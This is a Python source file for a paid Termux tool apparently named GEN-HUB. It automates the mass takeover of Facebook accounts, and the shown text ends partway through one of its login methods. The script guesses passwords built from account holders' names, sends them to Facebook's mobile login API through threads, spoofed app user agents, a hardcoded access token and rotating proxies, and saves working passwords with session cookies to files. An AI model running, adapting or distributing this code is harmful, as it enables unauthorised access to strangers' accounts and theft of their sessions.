#------------->> IMPORT >>-------------#
try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import mechanize
    import string
    import subprocess
    import bs4
    import urllib3
    import rich
    import base64
    import platform
    import httplib2
    import arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from datetime import datetime
except ModuleNotFoundError as e:
    print(f'>> MISSING MODULE: {e}')
    print('>> INSTALLING MISSING MODULES....! ')
    # Try to install missing modules
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "bs4", "rich", "urllib3", "httplib2", "arrow"])
        print('>> MODULES INSTALLED SUCCESSFULLY!')
        # Restart script
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except:
        print('>> FAILED TO INSTALL MODULES. PLEASE INSTALL MANUALLY:')
        print('>> pip install requests bs4 rich urllib3 httplib2 arrow')
        exit()

# Check if critical modules are imported
required_modules = ['sys', 'requests', 'bs4', 'tred', 'platform', 'httplib2', 'arrow']
for module in required_modules:
    if module not in dir():
        print(f'>> CRITICAL ERROR: {module} module not imported!')
        exit()

#------------->> KEY SYSTEM >>-------------#
def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    n = re.findall("(\\d\\d)", myid)
    plat = platform.version()[2:][:8][::-1].upper() + platform.release()[3:][::-1].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return "CHARSI-" + myid + xp

def subscription(message):
    clear()
    key = getKey()
    print(f"\033[1;97m [•] YOUR KEY   :  " + key)
    line()
    print(f'\033[1;97m [•] THIS TOOL IS PAID')
    print(f'\033[1;97m [•] YOU NEED TO APPROVAL')
    line()
    xh = input(f'\033[1;97m [•] PRESS ENTER FOR SEND YOUR KEY')
    if xh in ["Trail", "trail"]:
        trk.append('Trail')
        On()
    clear()
    uname = input(f'\033[1;97m [•] ENTER YOUR NAME : ')
    tsk = "Hi sir GEN! I Need To Aproval For Your Paid Tool So Please Approve My Key-:)\n\nName : " + uname + " \nKey : " + key
    subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+2348138189727&text=" + tsk])
    time.sleep(2)
    On()

trk = []

def On():
    try:
        clear()
        if "Trail" in trk:
            print(" Put Your Trail Key Bellow! ")
            line()
            key = input(' Put Key: ')
        else:
            key = getKey()
            
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        params = {'key': key, 'device': platform.platform()}
        url = "https://itsngr.serv00.net/checkpzh.php"
        
        http_obj = httplib2.Http()
        response, content = http_obj.request(
            uri=url + "?" + "&".join([f"{k}={v}" for k, v in params.items()]),
            method="GET",
            headers=headers
        )
        
        response = content.decode('utf-8')
        if "error" in response:
            if "Key has expired" in response:  
                subscription("\033[1;97m [•] Your Key Has Been Expired! ")
            else:
                subscription("\033[1;97m [•] You're Not Premium User ")
        elif "user" in response:
            result = json.loads(response)
            try:
                name = result['name']
            except:
                name = '-'
            user = result['user']
            exp = result['expired']
            join = result['joined']
            
            # Calculate days remaining
            date_today = arrow.now().format('YYYY-MM-DD')
            a = arrow.get(date_today)
            b = arrow.get(exp)
            delta = (b - a).days
            
            # If key is valid, start the main menu
            Menu()  # یہاں Menu() کو کال کریں، iAmMain().iAmMenu() نہیں
        else:
            On()
    except Exception as e:
        print(f"\033[1;97m [•] Error: {e}")
        time.sleep(1)
        exit()


#------------->> LOOP >>-------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];user=[];plist=[];pookie=[];ugen=[];show_cookies=[]
#------------------[ DATE ]-----------------#
dateti = str(datetime.now()).split(' ')[0]

#------------->> USER AGENT GENERATOR >>-------------#

ANDROID_DEVICES = {
    "Samsung": ["SM-A146P", "SM-A525F", "SM-G996B", "SM-A065F"],
    "Xiaomi": ["M2012K11AG", "Redmi Note 12", "Redmi Note 11"],
    "Infinix": ["X688B", "X683", "X671"],
    "Tecno": ["KE6", "PH9", "KG5p"],
    "OPPO": ["CPH2359", "CPH2403", "CPH2127"],
    "Vivo": ["V2130", "V2210"],
    "Google": ["Pixel 6a", "Pixel 7"],
    "Realme": ["RMX3581"]
}

ANDROID_VERSIONS = ["12", "13", "14", "15"]
CHROME_VERSIONS = [
    "120.0.6099.224",
    "121.0.6167.85",
    "122.0.6269.105",
    "123.0.6312.80",
    "134.0.6998.170"
]

IOS_VERSIONS = ["16_7_11", "17_4_1", "18_3_2"]
IPHONES = ["iPhone14,5", "iPhone15,3", "iPhone16,1"]

LOCALES = ["en_US", "en_GB", "en_NG", "fr_FR", "pt_BR"]
CARRIERS = ["MTN", "Airtel", "Glo", "9mobile", ""]

DESKTOP_BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
]

# -----------------------------
# HELPERS
# -----------------------------

def _fb_app_version():
    return f"{random.randint(400,600)}.0.0.{random.randint(20,99)}"

def _fb_build():
    return random.randint(100000000, 999999999)

# -----------------------------
# COMBINED UA GENERATOR
# -----------------------------

def generate_ua():
    mode = random.choice(["android", "ios", "browser"])

    # ========= ANDROID (WEBVIEW + FB4A CORE) =========
    if mode == "android":
        brand = random.choice(list(ANDROID_DEVICES.keys()))
        model = random.choice(ANDROID_DEVICES[brand])
        android = random.choice(ANDROID_VERSIONS)
        chrome = random.choice(CHROME_VERSIONS)
        locale = random.choice(LOCALES)
        carrier = random.choice(CARRIERS)

        width = random.choice([720, 1080])
        height = random.choice([1600, 2400])
        density = round(random.uniform(2.5, 3.0), 2)

        fbav = _fb_app_version()
        fbbv = _fb_build()
        fbrv = _fb_build()

        return (
            f"Mozilla/5.0 (Linux; Android {android}; {model} Build/SP1A.210812.016; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
            f"Chrome/{chrome} Mobile Safari/537.36 "
            f"[FB_IAB/FB4A;FBAV/{fbav};IABMV/1;] "
            f"[FBAN/FB4A;"
            f"FBAV/{fbav};"
            f"FBBV/{fbbv};"
            f"FBRV/{fbrv};"
            f"FBPN/com.facebook.katana;"
            f"FBLC/{locale};"
            f"FBCR/{carrier};"
            f"FBMF/{brand};"
            f"FBBD/{brand};"
            f"FBDV/{model};"
            f"FBSN/Android;"
            f"FBSV/{android};"
            f"FBCA/arm64-v8a:armeabi-v7a;"
            f"FBDM/{{density={density},width={width},height={height}}};]"
        )

    # ========= iOS =========
    elif mode == "ios":
        ios = random.choice(IOS_VERSIONS)
        device = random.choice(IPHONES)
        locale = random.choice(LOCALES)

        return (
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 "
            f"[FBAN/FBIOS;"
            f"FBAV/{_fb_app_version()};"
            f"FBBV/{_fb_build()};"
            f"FBDV/{device};"
            f"FBMD/iPhone;"
            f"FBSN/iOS;"
            f"FBSV/{ios.replace('_','.')} ;"
            f"FBLC/{locale};"
            f"FBOP/80]"
        )

    # ========= FACEBOOK WEB =========
    else:
        browser = random.choice(DESKTOP_BROWSERS)
        locale = random.choice(LOCALES)

        return (
            f"{browser} "
            f"[FBAV/{_fb_app_version()};FBID/web;FBLC/{locale}]"
        )

def get_ua():
    return generate_ua()

def generate_uaa(): 
# ----- Device info -----
    brands = {
        "Samsung": ["SM-A146P", "SM-M336B", "SM-A525F", "SM-G996B"],
        "Infinix": ["Infinix X688B", "Infinix X665C", "Infinix X683", "Infinix X671"],
        "Tecno": ["TECNO KG5p", "TECNO BD4j", "TECNO CH9n", "TECNO KF8"],
        "Xiaomi": ["Redmi Note 11", "Redmi Note 12", "Redmi 10C", "POCO M4 Pro"],
        "Oppo": ["CPH2127", "CPH2389", "CPH2457", "CPH2239"]
    }

    carriers = ["MTN", "Airtel", "Glo", "9mobile"]

    android_versions = ["12", "13", "14"]
    chrome_version = "134.0.6998.170"

    # ----- Random picks -----
    brand = random.choice(list(brands.keys()))
    model = random.choice(brands[brand])
    carrier = random.choice(carriers)
    android_version = random.choice(android_versions)
    fbbv = random.randint(3412000, 3418000)   # Build version
    fbrv = random.randint(812345678, 912345682)

    width = random.choice([720, 1080])
    height = random.choice([1600, 2400])
    density = round(random.uniform(2.5, 3.0), 2)

    # ----- UA format -----
    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/SP1A.210812.016; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 "
        f"[FB_IAB/FB4A;FBAV/506.1.0.74.27;IABMV/1;] "
        f"[FBAN/FB4A;FBAV/506.1.0.74.27;FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;"
        f"FBLC/en_NG;FBCR/{carrier};FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};"
        f"FBCA/arm64-v8a:armeabi-v7a;FBDM/{{density={density},width={width},height={height}}};]"
    )

def get_uaa():
    return generate_uaa()
    
#------------->> INTERNET CHECK >>-------------#
def check_internet():
    try:
        requests.get('https://www.google.com', timeout=10)
        return True
    except:
        return False

def wait_for_internet():
    while not check_internet():
        time.sleep(5)

#------------------[ WEB ]-----------------#
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
#------------------[ INSTALL ]-----------------#
#os.system('pkg install sox -y')
#os.system('pkg install espeak')
os.system('clear');os.system('espeak -a 300 "well,come to,The, WORLD,  OF,  MYSTERY"')
#------------------[ PROXY ]-----------------#
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()
#------------------[ DATE-CHECKER ]-----------------#
def tutulx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:9] in ['100000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:8] in ['10000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            tutulxz = '2010'
            return tutulxz
        if fx[:6] in ['100001']:
            tutulxz = '2010/2011'
            return tutulxz
        if fx[:6] in ['100002', '100003']:
            tutulxz = '2011/2012'
            return tutulxz
        if fx[:6] in ['100004']:
            tutulxz = '2012/2013'
            return tutulxz
        if fx[:6] in ['100005', '100006']:
            tutulxz = '2013/2014'
            return tutulxz
        if fx[:6] in ['100007', '100008']:
            tutulxz = '2014/2015'
            return tutulxz
        if fx[:6] in ['100009']:
            tutulxz = '2015'
            return tutulxz
        if fx[:5] in ['10001']:
            tutulxz = '2015/2016'
            return tutulxz
        if fx[:5] in ['10002']:
            tutulxz = '2016/2017'
            return tutulxz
        if fx[:5] in ['10003']:
            tutulxz = '2018/2019'
            return tutulxz
        if fx[:5] in ['10004']:
            tutulxz = '2019'
            return tutulxz
        if fx[:5] in ['10005']:
            tutulxz = '2020'
            return tutulxz
        if fx[:5] in ['10006', '10007', '10008']:
            tutulxz = '2021/2022'
            return tutulxz
        tutulxz = '2023'
        return tutulxz
    if len(fx) in [9, 10]:
        tutulxz = '2008/2009'
        return tutulxz
    if len(fx) == 8:
        tutulxz = '2007/2008'
        return tutulxz
    if len(fx) == 7:
        tutulxz = '2006/2007'
        return tutulxz
    tutulxz = '2023/2024'
    return tutulxz

#------------->> SYS PRO >>-------------#
sys.stdout.write('\x1b]2; GEN-HUB\x07')
#------------------[ COLOR ]-----------------#
B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x1b[10;94m';BG = '\x1b[10;95m';S = '\x1b[10;96m';W = '\x1b[10;97m';EX = '\x1b[0m';E = '\x1b[m'
#------------------[ SYTLE ]-----------------#
dt = '•'
#------------->> COLOUR >>-------------#
gx="\033[1;32m";wx="\x1b[1;97m";rx="\x1b[38;5;160m";cx="\x1b[1;96m";yx="\x1b[1;93m";bx='\x1b[1;90m'
#------------->> STYLE >>-------------#
xd=f"{bx}[{wx}~{bx}]{gx}";xd1=f"{bx}[{wx}1{bx}]{gx}";xd2=f"{bx}[{wx}2{bx}]{gx}";xd3=f"{bx}[{wx}3{bx}]{gx}";xd4=f"{bx}[{wx}4{bx}]{gx}";xd5=f"{bx}[{wx}5{bx}]{gx}";xd6=f"{bx}[{wx}6{bx}]{gx}";xd7=f"{bx}[{wx}7{bx}]{gx}";xd8=f"{bx}[{wx}8{bx}]{gx}";xd9=f"{bx}[{wx}9{bx}]{gx}";xd10=f"{bx}[{wx}10{bx}]{gx}";xd11=f"{bx}[{wx}11{bx}]{gx}";xd12=f"{bx}[{wx}12{bx}]{gx}";xd13=f"{bx}[{wx}13{bx}]{gx}";xd14=f"{bx}[{wx}14{bx}]{gx}";xd15=f"{bx}[{wx}15{bx}]{gx}";xd0=f"{bx}[{wx}0{bx}]{gx}";xdx=f"{bx}[{wx}?{bx}]{gx}"
#------------->> LOGO >>-------------#
os.system('xdg-open https://chat.whatsapp.com/F3IhtLI7duf4pMkhhXJSfd?mode=ems_copy_t')
logo = f'''
    {gx}░██████╗{wx}░███████╗{gx}███╗░░██╗
    {gx}██╔════╝{wx}░██╔════╝{gx}████╗░██║ {bx}|{gx} OWNER{bx}:{gx} MYSTERY
    {gx}██║░░██╗{wx}░█████╗{gx}░░██╔██╗██║
    {gx}██║░░╚██╗{wx}██╔══╝{gx}░░██║╚████║ {bx}|{gx} STATUS   {bx}:{rx}PAID
    {gx}╚██████╔╝{wx}███████╗{gx}██║░╚███║
    {gx}░╚═════╝{wx}░╚══════╝{gx}╚═╝░░╚══╝ {bx}|{gx} VERSION  {bx}:{wx} 1.3
{wx}{47*'-'}
       {gx}TOOLS {bx}|{wx}FILE{bx}|{wx}RANDOM{bx}|{wx}OLD{bx}| {gx}CLONE
{wx}{47*'-'}'''
#------------->> CLEAR PRO >>-------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{wx}{47*'-'}")

#------------->> MAIN MENU >>-------------#
def Menu():
    clear();print(f'{xd1} START FILE CLONING ');print(f'{xd2} START RANDOM {wx}ALL{gx} COUNTRY CLONING ');print(f'{xd3} START OLD CLONING ');print(f'{xd0} EXIT ALL CLONING ');linex();___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P___ in ['1']:____F_I_L_E____()
    elif ___O_P___ in ['2']:____R_A_N_D_O_M____()
    elif ___O_P___ in ['3']:____O_L_D____()
    elif ___O_P___ in ['0']:exit()
    else:linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);Menu()

#------------->> FILE MAIN MENU >>-------------#
def ____F_I_L_E____():
    clear();print(f'{xd} EXAMPLE {bx}:{gx} /sdcard/filename.txt ');linex();filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
    try:
          fo = open(filepro,'r').read().splitlines()
    except FileNotFoundError:linex();print(f'{xd}{rx} FILE NOT FOUND ');time.sleep(3);____F_I_L_E____()
    
    # Password selection menu for file cloning
    clear()
    print(f'{xd1} AUTO PASS 1 {wx}({gx}Recommended{wx})')
    print(f'{xd2} AUTO PASS 2 {wx}({gx}Alternative{wx})')
    print(f'{xd3} CUSTOM PASS {wx}({gx}Manual Entry{wx})')
    linex()
    pass_option = input(f'{xdx} SELECT PASSWORD OPTION {bx}:{wx} ')
    
    if pass_option in ['1']:
        # Auto Pass 1 - Common passwords with name variations
        plist.extend(['firstlast', 'first123', 'first1234', 'first12345', 'first@123', 'first@1234', 
                     'Firstlast', 'First123', 'First1234', 'First12345', 'First@123',
                     'First', 'Last', 'first080', 'First1', 'First12', 'First123', 'First1234', 
                     'lastfirst', 'First Last', 'FirstLast', 'first001', 'first081', 'firstlast001', 
                     'firstlast123', 'firstlast1234', 'firstlast12', 'first@123', 'Firstlast123',
                     'first', 'last', 'firstlast', 'first1', 'first12', 'last123', 'first last', 'last first'])
    elif pass_option in ['2']:
        # Auto Pass 2 - More variations
        plist.extend(['first', 'last', 'firstlast', 'first1', 'first12', 'first123', 'first1234',
                     'last1', 'last12', 'last123', 'first last', 'last first', 'Firstlast1234',
                     'first080', 'first081', 'first090', 'first070', 'first1212', 'first1122',
                     'lastfirst', 'First Last', 'FirstLast', 'first001', 'firstlast001',
                     'firstlast123', 'firstlast1234', 'firstlast@123', 'Firstlast123', 
                     'First', 'Last', 'Firstlast', 'First1', 'First12', 'First123', 'First1234',
                     'first@123', 'first@1234', 'First@123', 'First@1234', 'first@', 'first123456',
                     'name', 'Name', 'name123', 'Name123', 'name1234', 'Name1234'])
    elif pass_option in ['3']:
        # Custom Pass - Manual entry
        clear()
        print(f'{xd} EXAMPLE {bx}:{gx} firstlast {bx}|{gx} first123 {bx}|{gx} first@@ ')
        linex()
        try:
            ps_limit = int(input(f'{xdx} HOW MANY PASSWORDS TO ADD {bx}:{wx} '))
        except:
            ps_limit = 5
        clear()
        for i in range(ps_limit):
            plist.append(input(f'{xd} ENTER PASSWORD NO {wx}{i+1} {bx}:{wx} '))
    else:
        linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);____F_I_L_E____()
        return
    
    clear()
    print(f'{xd1} METHOD {wx}~{gx} M1');print(f'{xd2} METHOD {wx}~{gx} M2');print(f'{xd3} METHOD {wx}~{gx} M3')
    print(f'{xd4} METHOD {wx}~{gx} M4');print(f'{xd5} METHOD {wx}~{gx} M5');print(f'{xd6} METHOD {wx}~{gx} M6')
    print(f'{xd7} METHOD {wx}~{gx} M7');print(f'{xd8} METHOD {wx}~{gx} M8')
    linex();___M_E_T_H_O_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    
    clear();___C_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_P___ in ['y','Y','yes','Yes','1']:pcp.append('y')
    else:pcp.append('n')
    clear();___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_O_O_K_I_E_S___ in ['y','Y','yes','Yes','1']:show_cookies.append('y')
    else:show_cookies.append('n')
    with tred(max_workers=30) as ___H_U_B___:
            clear();total_ids = str(len(fo))
            print(f'{xd} TOTAL UID{bx}|{gx}METHOD {bx}:{wx} {total_ids}{bx}|{wx}M{___M_E_T_H_O_D___} ');print(f'{xd} TODAYS DATE   {wx}: {dateti} ');print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}2{gx} MINUTES ');linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if ___M_E_T_H_O_D___ in ['1']:___H_U_B___.submit(___M_T_H_D_1___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['2']:___H_U_B___.submit(___M_T_H_D_2___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['3']:___H_U_B___.submit(___M_T_H_D_3___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['4']:___H_U_B___.submit(___M_T_H_D_4___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['5']:___H_U_B___.submit(___M_T_H_D_5___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['6']:___H_U_B___.submit(___M_T_H_D_6___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['7']:___H_U_B___.submit(___M_T_H_D_7___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['8']:___H_U_B___.submit(___M_T_H_D_8___,ids,names,passlist)
    print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f"{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}");print(f"{xd} TOTAL CP IDS {bx}:\x1b[38;5;205m {len(cps)}");print(f"{xd} TOTAL 2FA IDS {bx}:\x1b[38;5;214m {len(twf)}");print(f"{wx}{47*'-'}");exit()

#------------->> FILE METHOD M1 B-GRAPH >>-------------#
def ___M_T_H_D_1___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    wait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = get_ua()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent":ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M1-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M2 GRAPH >>-------------#
def ___M_T_H_D_2___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    pwait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = get_ua()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M2-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M3 B-GRAPH (mini) >>-------------#
def ___M_T_H_D_3___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    wpait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = get_ua()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"email": ids,"password": pas,"generate_analytics_claims": "1","credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
